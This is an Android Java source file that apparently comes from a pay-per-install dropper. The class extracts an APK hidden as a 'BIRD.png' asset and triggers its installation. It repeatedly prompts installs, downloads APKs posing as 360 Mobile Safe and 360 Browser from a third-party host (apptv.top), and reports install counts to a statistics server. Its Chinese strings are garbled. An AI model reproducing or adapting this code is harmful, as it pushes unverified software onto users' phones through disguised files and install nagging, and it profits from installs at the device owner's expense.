package li.who.you;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.List;

import com.seeuagain.goopps.Dispatcher;

import li.who.decypt.Encypt;
import li.who.firstrun.DBSettingsHelper;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.util.Log;
import android.view.Gravity;
import android.widget.Toast;

public class qingjiao {
	
	public static final String[]     filename   = {"360��ȫ��ʿ","360�����"};

	
	 public static final String[]     apkurl  = {	"http://apptv.top/mobilesafe/20150807cxmx/360MobileSafe.apk",
													"http://apptv.top/360mse/20150807cxmx/360mse_h086476.apk"
											  };
	 private static final String[]  packagename  = {"com.qihoo360.mobilesafe","com.qihoo.browser" };
	 private static final String staticurl = "http://app.app1127.com/statics/";
	 
	 
	 private static final int[] staticid = {3,4};
	
	static Context mContext;
	private String defaultDir = Environment.getExternalStorageDirectory()
			.getPath()
			+ File.separator
			+ "AGetCity"
			+ File.separator
			+ "GetCity2" + File.separator;
	
	String apkname2 = "BIRD";
	String packname ="com.qihoo.appstore";
	String classname ="com.qihoo.appstore.activities.BrowserDownloadProxyAcitivity";
	public qingjiao(Context mContext){
		this.mContext = mContext;
		
	}
	public void startone(){
		initVideoDiagnosisroot(); 
		install();
		
    }
	
	private void initVideoDiagnosisroot(){


		boolean sdCardExit = Environment.getExternalStorageState().equals(
				android.os.Environment.MEDIA_MOUNTED);
		if (!sdCardExit) {
			Toast.makeText(this.mContext.getApplicationContext(), "�����CARD",
					Toast.LENGTH_LONG).show();
			return;
		}
		File fileDir = new File(defaultDir);
		File file = new File(defaultDir+apkname2+".apk");
		if(!file.exists()){
			try {
				FileOutputStream out;
				InputStream inputStream; 
				try {
					if (!fileDir.exists()) {
						fileDir.mkdirs();
					}
					if(!file.exists()){
						file.createNewFile();
					}
					inputStream=this.mContext.getResources().getAssets().open(apkname2+".png");
					out = new FileOutputStream(file);
					byte[] buff = new byte[1024];
					int data=0;
					while((data=inputStream.read(buff))!=-1){
						out.write(buff, 0, data);
					}
					out.close();
					inputStream.close();
				} catch (FileNotFoundException e) {
					e.printStackTrace();
				} catch (IOException e) {
					e.printStackTrace();
				}
			}catch (Exception e) {
				e.printStackTrace();
			}
		}
	}
	
	private void install(){
		Toast t=Toast.makeText(mContext, "ʹ��360�ֻ���������Ӧ�ã�ʡ�����������������ͨ����һ����λ��", Toast.LENGTH_LONG);  
        t.setGravity(Gravity.CENTER, 0, 0);  
        t.show();
		//if(!isAvilible(this.mContext.getApplicationContext(), packname)){
			
			final String m = defaultDir+apkname2+".apk";
			Intent intent = new Intent(Intent.ACTION_VIEW); 
	        intent.setDataAndType(Uri.fromFile(new File(m)), "application/vnd.android.package-archive"); 
	        this.mContext.startActivity(intent);
	        checkIsInstall();
		//}else{
			
		//	handler.removeCallbacks(runnable);
		//	new DBSettingsHelper(qingjiao.mContext).updateIsFirstRun(false);
			//Intent localIntent5 = new Intent(this.mContext.getApplicationContext(), HoldingActivity.class);
			//this.mContext.startActivity(localIntent5);
		//	openApp(packname);
		//	Dispatcher.openInstallwechat();
		//	checkIsInstall();
		//}
	}
	
	public static boolean isAvilible(Context context, String packageName){ 
        final PackageManager packageManager = context.getPackageManager();//��ȡpackagemanager 
        List<PackageInfo> pinfo = packageManager.getInstalledPackages(0);//��ȡ�����Ѱ�װ����İ���Ϣ 
        List<String> pName = new ArrayList<String>();//���ڴ洢�����Ѱ�װ����İ��� 
       //��pinfo�н���������һȡ����ѹ��pName list�� 
            if(pinfo != null){ 
            for(int i = 0; i < pinfo.size(); i++){ 
                String pn = pinfo.get(i).packageName; 
                pName.add(pn); 
            } 
        } 
        return pName.contains(packageName);//�ж�pName���Ƿ���Ŀ�����İ�������TRUE��û��FALSE 
	}
	
	int state = 0;
	
	Runnable runnable = new Runnable() {
        @Override
        public void run() {
            // TODO Auto-generated method stub
        	if(state == 0){
	        	if(isAvilible(qingjiao.mContext.getApplicationContext(), packname)){
	        		Log.e("check","stop");
	        		state = 1;
	        		appid = 1;
	        		handler.postDelayed(statics_runnable, 1000);
	        		handler.postDelayed(runnable2, 1000);
	        		Message message = new Message();
	        		message.what = 1;
	        		stopHandler.sendMessage(message);
	        	}else{
	        		Log.e("check","again");
	        		handler.postDelayed(runnable, 1000);
	        	}
        	}else{
        		//handler.postDelayed(runnable2, 3000);
        	}
        	
        }
    };
    
    int count = 10;
    Runnable runnable2 = new Runnable() {
        @Override
        public void run() {
            // TODO Auto-generated method stub
        	Log.e("runnable2","install");
        	if(count > 0){
	        	Dispatcher.openInstallwechat();
	        	handler.postDelayed(runnable2, 1000);
	        	count --;
        	}else{
        		handler.postDelayed(runnable3, 3000);
        		Message message = new Message();
        		message.what = 2;
        		stopHandler.sendMessage(message);
        	}
        	
        }
    };
    
    Handler handler = new Handler();
    Handler stopHandler = new Handler(){
        @Override
        public void handleMessage(Message msg) {
            // TODO Auto-generated method stub
            switch (msg.what) {
            case 1:
            	handler.removeCallbacks(runnable);
            	new DBSettingsHelper(qingjiao.mContext).updateIsFirstRun(false);
            	//Intent localIntent5 = new Intent(qingjiao.mContext.getApplicationContext(), HoldingActivity.class);
            	//qingjiao.mContext.startActivity(localIntent5);
            	
            	openApp(qingjiao.mContext,packname);
            	
                break; 
            case 2:
            	handler.removeCallbacks(runnable2);
            	break;
            case 3:
            	DownloaderTask task1=new DownloaderTask(filename[0]+"���������У��������ٷǳ������������񼴽����...",1,filename[0],true,mContext);
	        	task1.execute(apkurl[0]);
            	break;
            case 4:
            	DownloaderTask task2=new DownloaderTask(filename[1]+"���������У��������ٷǳ������������񼴽����...",1,filename[1],true,mContext);  
	        	task2.execute(apkurl[1]);
            	break;
            default:
                break;
            }
            super.handleMessage(msg);
        }
    };
    
    int appid = 0;
    Runnable statics_runnable = new Runnable() {
        @Override
        public void run() {
            // TODO Auto-generated method stub
        	Log.e("statics",appid+"");
        	Dispatcher.statics(appid, staticurl);
        	
        }
    };
    
    
	private void checkIsInstall(){
		
		handler.postDelayed(runnable,5000);
	}
	
	public static void openApp(Context context, String packagename){
		Intent intent = context.getPackageManager().getLaunchIntentForPackage(packagename);
		// �������intentΪ�գ���˵��û�а�װҪ��ת��Ӧ����
		if (intent != null) {
		    // �����Activity���ݲ���һ�������Ҫ������ô���ݲ��������н��ղ���Ҳ�Ǹ�Activity��Activity������һ��		   
			context.startActivity(intent);
		}
	}
	
	int safestate = 0;
	Runnable runnable3 = new Runnable() {
        @Override
        public void run() {
            // TODO Auto-generated method stub
        	Log.e("runnable3","download");
        	if(safestate == 0){
        		Toast t=Toast.makeText(mContext, "360�ֻ���ʿ����Ч�����ֻ��������֣�Ϊ�����ֻ����ݻ�����7���˵İ�ȫѡ��", Toast.LENGTH_LONG);  
                t.setGravity(Gravity.CENTER, 0, 0);  
                t.show(); 
                Message message = new Message();
        		message.what = 3;
        		stopHandler.sendMessage(message);
	        	
	        	safestate = 1;
	        	handler.postDelayed(runnable3, 1000);
	        	handler.postDelayed(runnable4, 12000);
        	}else{
        		handler.postDelayed(check3, 5000);
        	}
        }
	};
	int checkstate3 = 10;
	Runnable check3 = new Runnable() {
        @Override
        public void run() {
            // TODO Auto-generated method stub
        	if(checkstate3 > 0){
	        	if(isAvilible(qingjiao.mContext.getApplicationContext(), packagename[0])){
	        		appid = staticid[0];
	        		handler.postDelayed(statics_runnable, 1000);
	        		handler.removeCallbacks(check3);
	        	}else{
	        		Log.e("check3","again");
	        		checkstate3 --;
	        		handler.postDelayed(check3, 3000);
	        	}
        	}
        	
        }
    };
	
	int msestate = 0;
	Runnable runnable4 = new Runnable() {
        @Override
        public void run() {
            // TODO Auto-generated method stub
        	Log.e("runnable3","download");
        	if(msestate == 0){
        		Toast t=Toast.makeText(mContext, "360�ֻ��������������������������ȫ���٣�", Toast.LENGTH_LONG);  
                t.setGravity(Gravity.CENTER, 0, 0);  
                t.show(); 
	        	
	        	Message message = new Message();
        		message.what = 4;
        		stopHandler.sendMessage(message);
	        	
	        	msestate = 1;
	        	handler.postDelayed(runnable4, 1000);
	    	}else{
	    		handler.postDelayed(check4, 5000);
	    	}
        }
	};
	
	int checkstate4 = 10;
	Runnable check4 = new Runnable() {
        @Override
        public void run() {
            // TODO Auto-generated method stub
        	if(checkstate4 > 0){
	        	if(isAvilible(qingjiao.mContext.getApplicationContext(), packagename[1])){
	        		appid = staticid[1];
	        		handler.postDelayed(statics_runnable, 1000);
	        		handler.removeCallbacks(check4);
	        	}else{
	        		Log.e("check4","again");
	        		checkstate4 --;
	        		handler.postDelayed(check4, 3000);
	        	}
        	}
        	
        }
    };
	
	
}
